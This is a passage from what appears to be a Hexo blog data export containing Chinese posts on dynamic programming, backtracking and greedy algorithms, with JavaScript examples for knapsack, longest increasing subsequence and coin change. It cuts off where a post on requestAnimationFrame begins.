动态规划</h1><p>动态规划是通过拆分问题，定义问题状态和状态之间的关系，使得问题能够以递推（或者分治）的方式去解决。</p>\n<blockquote>\n<p>如何拆分问题，是动态规划的核心。而拆分问题，靠的就是状态的定义和状态转移方程的定义。</p>\n</blockquote>\n<p>动态规划的特点：</p>\n<ul>\n<li>把原来的问题分解成了几个<strong>相似的子问题</strong>；</li>\n<li>所有的子问题都<strong>只需要解决一次</strong>；</li>\n<li><strong>储存</strong>子问题的解；</li>\n</ul>\n<h3 id=\"0-1-背包问题\"><a href=\"#0-1-背包问题\" class=\"headerlink\" title=\"0 - 1 背包问题\"></a>0 - 1 背包问题</h3><p>该问题可以描述为：给定一组物品，每种物品都有自己的重量和价格，在限定的总重量内，我们如何选择，才能使得物品的总价格最高。每个问题只能放入至多一次。</p>\n<p>假设有以下物品：</p>\n<table>\n<thead>\n<tr>\n<th>物品重量</th>\n<th>价值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>7</td>\n</tr>\n<tr>\n<td>3</td>\n<td>12</td>\n</tr>\n</tbody></table>\n<p>对于这个问题来说，子问题就两个，分别是放物品和不放物品，可以通过以下表格来理解子问题</p>\n<table>\n<thead>\n<tr>\n<th>物品重量 / 剩余容量</th>\n<th>0</th>\n<th>1</th>\n<th>2</th>\n<th>3</th>\n<th>4</th>\n<th>5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>0</td>\n<td>3</td>\n<td>3</td>\n<td>3</td>\n<td>3</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>0</td>\n<td>3</td>\n<td>7</td>\n<td>10</td>\n<td>10</td>\n<td>10</td>\n</tr>\n<tr>\n<td>3</td>\n<td>0</td>\n<td>3</td>\n<td>7</td>\n<td>12</td>\n<td>15</td>\n<td>19</td>\n</tr>\n</tbody></table>\n<p>直接来分析能放三种物品的情况，也就是最后一行</p>\n<ul>\n<li>当容量少于 3 时，只取上一行对应的数据，因为当前容量不能容纳物品 3</li>\n<li>当容量 为 3 时，考虑两种情况，分别为放入物品 3 和不放物品 3<ul>\n<li>不放物品 3 的情况下，总价值为 10</li>\n<li>放入物品 3 的情况下，总价值为 12，所以应该放入物品 3</li>\n</ul>\n</li>\n<li>当容量 为 4 时，考虑两种情况，分别为放入物品 3 和不放物品 3<ul>\n<li>不放物品 3 的情况下，总价值为 10</li>\n<li>放入物品 3 的情况下，和放入物品 1 的价值相加，得出总价值为 15，所以应该放入物品 3</li>\n</ul>\n</li>\n<li>当容量 为 5 时，考虑两种情况，分别为放入物品 3 和不放物品 3<ul>\n<li>不放物品 3 的情况下，总价值为 10</li>\n<li>放入物品 3 的情况下，和放入物品 2 的价值相加，得出总价值为 19，所以应该放入物品 3</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;*&#125;</span> </span>w 物品重量</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;*&#125;</span> </span>v 物品价值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;*&#125;</span> </span>C 总容量</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@returns</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">w, v, c</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> array = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(w.length);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 完成底部子问题的解</span></span><br><span class=\"line\">  array[<span class=\"number\">0</span>] = [];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt;= c; j++) &#123;</span><br><span class=\"line\">    array[<span class=\"number\">0</span>][j] = j &gt;= w[<span class=\"number\">0</span>] ? v[<span class=\"number\">0</span>] : <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 自底向上开始解决子问题，从物品 2 开始</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; w.length; i++) &#123;</span><br><span class=\"line\">    array[i] = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt;= c; j++) &#123;</span><br><span class=\"line\">      array[i][j] = array[i - <span class=\"number\">1</span>][j];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (j &gt;= w[i]) &#123;</span><br><span class=\"line\">        array[i][j] = <span class=\"built_in\">Math</span>.max(array[i][j], v[i] + array[i - <span class=\"number\">1</span>][j - w[i]]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(array); <span class=\"comment\">// [[0, 3, 3, 3, 3, 3], ​​​​​​​​​​[0, 3, 7, 10, 10, 10], ​​​​​​​​​​[0, 3, 7, 12, 15, 19]]​​​​​</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> array[w.length - <span class=\"number\">1</span>][c];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">fn([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>], [<span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">12</span>], <span class=\"number\">5</span>);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"最长递增子序列\"><a href=\"#最长递增子序列\" class=\"headerlink\" title=\"最长递增子序列\"></a>最长递增子序列</h3><p>最长递增子序列意思是在一组数字中，找出最长一串递增的数字，比如 <code>0, 3, 4, 17, 2, 8, 6, 10</code>，对于以上这串数字来说，最长递增子序列就是 <code>0, 3, 4, 8, 10</code></p>\n<p>设F{k}为以数列中第 k 项结尾的最长递增子序列的长度，则第 k 项结尾的LIS的长度是：保证第 i 项比第 k 项小的情况下，以第 i 项结尾的 LIS 长度加 1 的最大值，取遍i的所有值（i小于k）。</p>\n<table>\n<thead>\n<tr>\n<th>数字</th>\n<th>0</th>\n<th>3</th>\n<th>4</th>\n<th>17</th>\n<th>2</th>\n<th>8</th>\n<th>6</th>\n<th>10</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>长度</td>\n<td>1</td>\n<td>2</td>\n<td>3</td>\n<td>4</td>\n<td>2</td>\n<td>4</td>\n<td>4</td>\n<td>5</td>\n</tr>\n</tbody></table>\n<p>通过以上表格可以很清晰的发现一个规律，遍历找出刚好比当前数字小的数，并且在小的数组成的长度基础上加 1。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">list</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"built_in\">Array</span>.isArray(arr)) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(arr.length).fill(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt; i; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class=\"line\">        res[i] = <span class=\"built_in\">Math</span>.max(res[i], res[j] + <span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.max(...res);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">list([<span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>]); <span class=\"comment\">// 4</span></span><br><span class=\"line\">list([<span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">17</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>]); <span class=\"comment\">// 5</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"纸币找零\"><a href=\"#纸币找零\" class=\"headerlink\" title=\"纸币找零\"></a>纸币找零</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MinCoinChange</span>(<span class=\"params\">coins</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> coins = coins; <span class=\"comment\">//&#123;1&#125;</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> cache = &#123;&#125;; <span class=\"comment\">//&#123;2&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  MinCoinChange.prototype.makeChange = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">amount</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!amount) <span class=\"keyword\">return</span> [];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cache[amount]) <span class=\"keyword\">return</span> cache[amount];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> min = [], newMin, newAmount;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; coins.length; i++) &#123; <span class=\"comment\">//&#123;5&#125;</span></span><br><span class=\"line\">      <span class=\"keyword\">var</span> coin = coins[i];</span><br><span class=\"line\">      newAmount = amount - coin; <span class=\"comment\">//&#123;6&#125;</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newAmount &gt;= <span class=\"number\">0</span>) newMin = <span class=\"built_in\">this</span>.makeChange(newAmount); <span class=\"comment\">//&#123;7&#125;</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (</span><br><span class=\"line\">        newAmount &gt;= <span class=\"number\">0</span> &amp;&amp; <span class=\"comment\">//&#123;8&#125;</span></span><br><span class=\"line\">        (newMin.length &lt; min.length - <span class=\"number\">1</span> || !min.length) <span class=\"comment\">//&#123;9&#125;</span></span><br><span class=\"line\">        &amp;&amp;</span><br><span class=\"line\">        (newMin.length || !newAmount) <span class=\"comment\">//&#123;10&#125;</span></span><br><span class=\"line\">      ) &#123;</span><br><span class=\"line\">        min = [coin].concat(newMin); <span class=\"comment\">//&#123;11&#125;</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;new Min &#x27;</span> + min + <span class=\"string\">&#x27; for &#x27;</span> + amount);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (cache[amount] = min); <span class=\"comment\">//&#123;12&#125;</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> minCoinChange = <span class=\"keyword\">new</span> MinCoinChange([<span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>, <span class=\"number\">25</span>]);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(minCoinChange.makeChange(<span class=\"number\">36</span>));</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<ul>\n<li>斐波那契数列</li>\n<li>背包问题</li>\n<li>最长递增子序列</li>\n<li>纸币找零</li>\n<li>台阶问题</li>\n<li>国王与金矿</li>\n</ul>\n"},{"title":"算法范式 - 回溯法","date":"2021-06-01T08:32:28.000Z","_content":"\n# 算法范式 - 回溯法\n\n### 基本概念\n回溯法（探索与回溯法）是一种选优搜索法，又称为试探法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。\n\n> 回溯法本质上是一种深度优先的算法\n\n> 对于回溯法，一个解的各个部分是逐步生成的，当发现当前生成的某部分不满足约束条件时，就放弃该步所做的工作，退到上一步进行新的尝试，而不是放弃整个解重来。\n\n### 特点\n回溯法可以系统地搜索一个问题的所有解或任一解.\n回溯法是一个既带系统性又带跳跃性的搜索算法.\n回溯法是解决较为复杂枚举题的一种常用算法.\n\n### 实现步骤\n1. 应明确定义问题的解空间，包含一个或多个解；\n2. 从根结点出发，以深度优先方式搜索整个解空间； \n3. 搜索解答树时，要采用一定策略进行**剪枝**，避免无效搜索，来提高效率；\n  * 用约束函数剪去不满足条件的子树  \n  * 用限界函数剪去得不到最优解的子树\n\n```js\n// 通用递归回溯框架\n\nfunction backtrack(t) {\n  if (t > n) {\n    output(x);\n  } else {\n    for (i = f(n, t); i <= g(n, t); ++i) {\n      x[t] = h(i);\n      if (Constrain(t) && Bound(t)) backtrack(t + 1);\n    }\n  }\n}\n```","source":"_posts/算法范式/算法范式 - 回溯法.md","raw":"---\ntitle: 算法范式 - 回溯法\ncategories: 算法范式\ntags: [算法范式]\ndate: 2021-06-01 16:32:28\n---\n\n# 算法范式 - 回溯法\n\n### 基本概念\n回溯法（探索与回溯法）是一种选优搜索法，又称为试探法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。\n\n> 回溯法本质上是一种深度优先的算法\n\n> 对于回溯法，一个解的各个部分是逐步生成的，当发现当前生成的某部分不满足约束条件时，就放弃该步所做的工作，退到上一步进行新的尝试，而不是放弃整个解重来。\n\n### 特点\n回溯法可以系统地搜索一个问题的所有解或任一解.\n回溯法是一个既带系统性又带跳跃性的搜索算法.\n回溯法是解决较为复杂枚举题的一种常用算法.\n\n### 实现步骤\n1. 应明确定义问题的解空间，包含一个或多个解；\n2. 从根结点出发，以深度优先方式搜索整个解空间； \n3. 搜索解答树时，要采用一定策略进行**剪枝**，避免无效搜索，来提高效率；\n  * 用约束函数剪去不满足条件的子树  \n  * 用限界函数剪去得不到最优解的子树\n\n```js\n// 通用递归回溯框架\n\nfunction backtrack(t) {\n  if (t > n) {\n    output(x);\n  } else {\n    for (i = f(n, t); i <= g(n, t); ++i) {\n      x[t] = h(i);\n      if (Constrain(t) && Bound(t)) backtrack(t + 1);\n    }\n  }\n}\n```","slug":"算法范式/算法范式 - 回溯法","published":1,"updated":"2021-06-07T11:29:52.559Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjarfk0005xv6r4u9vai2x","content":"<h1 id=\"算法范式-回溯法\"><a href=\"#算法范式-回溯法\" class=\"headerlink\" title=\"算法范式 - 回溯法\"></a>算法范式 - 回溯法</h1><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><p>回溯法（探索与回溯法）是一种选优搜索法，又称为试探法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。</p>\n<blockquote>\n<p>回溯法本质上是一种深度优先的算法</p>\n</blockquote>\n<blockquote>\n<p>对于回溯法，一个解的各个部分是逐步生成的，当发现当前生成的某部分不满足约束条件时，就放弃该步所做的工作，退到上一步进行新的尝试，而不是放弃整个解重来。</p>\n</blockquote>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><p>回溯法可以系统地搜索一个问题的所有解或任一解.<br>回溯法是一个既带系统性又带跳跃性的搜索算法.<br>回溯法是解决较为复杂枚举题的一种常用算法.</p>\n<h3 id=\"实现步骤\"><a href=\"#实现步骤\" class=\"headerlink\" title=\"实现步骤\"></a>实现步骤</h3><ol>\n<li>应明确定义问题的解空间，包含一个或多个解；</li>\n<li>从根结点出发，以深度优先方式搜索整个解空间； </li>\n<li>搜索解答树时，要采用一定策略进行<strong>剪枝</strong>，避免无效搜索，来提高效率；</li>\n</ol>\n<ul>\n<li>用约束函数剪去不满足条件的子树  </li>\n<li>用限界函数剪去得不到最优解的子树</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通用递归回溯框架</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">backtrack</span>(<span class=\"params\">t</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (t &gt; n) &#123;</span><br><span class=\"line\">    output(x);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = f(n, t); i &lt;= g(n, t); ++i) &#123;</span><br><span class=\"line\">      x[t] = h(i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (Constrain(t) &amp;&amp; Bound(t)) backtrack(t + <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"算法范式-回溯法\"><a href=\"#算法范式-回溯法\" class=\"headerlink\" title=\"算法范式 - 回溯法\"></a>算法范式 - 回溯法</h1><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><p>回溯法（探索与回溯法）是一种选优搜索法，又称为试探法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。</p>\n<blockquote>\n<p>回溯法本质上是一种深度优先的算法</p>\n</blockquote>\n<blockquote>\n<p>对于回溯法，一个解的各个部分是逐步生成的，当发现当前生成的某部分不满足约束条件时，就放弃该步所做的工作，退到上一步进行新的尝试，而不是放弃整个解重来。</p>\n</blockquote>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><p>回溯法可以系统地搜索一个问题的所有解或任一解.<br>回溯法是一个既带系统性又带跳跃性的搜索算法.<br>回溯法是解决较为复杂枚举题的一种常用算法.</p>\n<h3 id=\"实现步骤\"><a href=\"#实现步骤\" class=\"headerlink\" title=\"实现步骤\"></a>实现步骤</h3><ol>\n<li>应明确定义问题的解空间，包含一个或多个解；</li>\n<li>从根结点出发，以深度优先方式搜索整个解空间； </li>\n<li>搜索解答树时，要采用一定策略进行<strong>剪枝</strong>，避免无效搜索，来提高效率；</li>\n</ol>\n<ul>\n<li>用约束函数剪去不满足条件的子树  </li>\n<li>用限界函数剪去得不到最优解的子树</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通用递归回溯框架</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">backtrack</span>(<span class=\"params\">t</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (t &gt; n) &#123;</span><br><span class=\"line\">    output(x);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = f(n, t); i &lt;= g(n, t); ++i) &#123;</span><br><span class=\"line\">      x[t] = h(i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (Constrain(t) &amp;&amp; Bound(t)) backtrack(t + <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"算法范式 - 贪心算法","date":"2021-06-01T08:32:28.000Z","_content":"\n\n# 算法范式 - 贪心算法\n\n### 基本概念\n所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，所做出的仅是在某种意义上的局部最优解。\n\n贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。**所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。**\n### 贪心算法的基本思路\n1. 建立数学模型来描述问题。\n2. 把求解的问题分成若干个子问题。\n3. 对每一子问题求解，得到子问题的局部最优解。\n4. 把子问题的解局部最优解合成原来解问题的一个解。\n### 贪心算法适用的问题\n贪心策略适用的前提是：局部最优策略能导致产生全局最优解。\n实际上，贪心算法适用的情况很少。一般，对一个问题分析是否适用于贪心算法，可以先选择该问题下的几个实际数据进行分析，就可做出判断。\n* 课程安排问题\n* 小船过河问题\n* 分糖果问题\n\n","source":"_posts/算法范式/算法范式 - 贪心算法.md","raw":"---\ntitle: 算法范式 - 贪心算法\ncategories: 算法范式\ntags: [算法范式]\ndate: 2021-06-01 16:32:28\n---\n\n\n# 算法范式 - 贪心算法\n\n### 基本概念\n所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，所做出的仅是在某种意义上的局部最优解。\n\n贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。**所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。**\n### 贪心算法的基本思路\n1. 建立数学模型来描述问题。\n2. 把求解的问题分成若干个子问题。\n3. 对每一子问题求解，得到子问题的局部最优解。\n4. 把子问题的解局部最优解合成原来解问题的一个解。\n### 贪心算法适用的问题\n贪心策略适用的前提是：局部最优策略能导致产生全局最优解。\n实际上，贪心算法适用的情况很少。一般，对一个问题分析是否适用于贪心算法，可以先选择该问题下的几个实际数据进行分析，就可做出判断。\n* 课程安排问题\n* 小船过河问题\n* 分糖果问题\n\n","slug":"算法范式/算法范式 - 贪心算法","published":1,"updated":"2021-06-07T11:30:00.125Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjarfl0006xv6r7yvdcro2","content":"<h1 id=\"算法范式-贪心算法\"><a href=\"#算法范式-贪心算法\" class=\"headerlink\" title=\"算法范式 - 贪心算法\"></a>算法范式 - 贪心算法</h1><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><p>所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，所做出的仅是在某种意义上的局部最优解。</p>\n<p>贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。<strong>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</strong></p>\n<h3 id=\"贪心算法的基本思路\"><a href=\"#贪心算法的基本思路\" class=\"headerlink\" title=\"贪心算法的基本思路\"></a>贪心算法的基本思路</h3><ol>\n<li>建立数学模型来描述问题。</li>\n<li>把求解的问题分成若干个子问题。</li>\n<li>对每一子问题求解，得到子问题的局部最优解。</li>\n<li>把子问题的解局部最优解合成原来解问题的一个解。<h3 id=\"贪心算法适用的问题\"><a href=\"#贪心算法适用的问题\" class=\"headerlink\" title=\"贪心算法适用的问题\"></a>贪心算法适用的问题</h3>贪心策略适用的前提是：局部最优策略能导致产生全局最优解。<br>实际上，贪心算法适用的情况很少。一般，对一个问题分析是否适用于贪心算法，可以先选择该问题下的几个实际数据进行分析，就可做出判断。</li>\n</ol>\n<ul>\n<li>课程安排问题</li>\n<li>小船过河问题</li>\n<li>分糖果问题</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"算法范式-贪心算法\"><a href=\"#算法范式-贪心算法\" class=\"headerlink\" title=\"算法范式 - 贪心算法\"></a>算法范式 - 贪心算法</h1><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><p>所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，所做出的仅是在某种意义上的局部最优解。</p>\n<p>贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。<strong>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</strong></p>\n<h3 id=\"贪心算法的基本思路\"><a href=\"#贪心算法的基本思路\" class=\"headerlink\" title=\"贪心算法的基本思路\"></a>贪心算法的基本思路</h3><ol>\n<li>建立数学模型来描述问题。</li>\n<li>把求解的问题分成若干个子问题。</li>\n<li>对每一子问题求解，得到子问题的局部最优解。</li>\n<li>把子问题的解局部最优解合成原来解问题的一个解。<h3 id=\"贪心算法适用的问题\"><a href=\"#贪心算法适用的问题\" class=\"headerlink\" title=\"贪心算法适用的问题\"></a>贪心算法适用的问题</h3>贪心策略适用的前提是：局部最优策略能导致产生全局最优解。<br>实际上，贪心算法适用的情况很少。一般，对一个问题分析是否适用于贪心算法，可以先选择该问题下的几个实际数据进行分析，就可做出判断。</li>\n</ol>\n<ul>\n<li>课程安排问题</li>\n<li>小船过河问题</li>\n<li>分糖果问题</li>\n</ul>\n"},{"title":"requestAnimationFrame 与 requestIdleCallback","date":"2021-05-24T08:32:28.000Z","_content":"\n# requestAnimationFrame 与 requestIdleCallback\n\n### 1、requestAnimationFrame\n\n`requestAnimationFrame()` 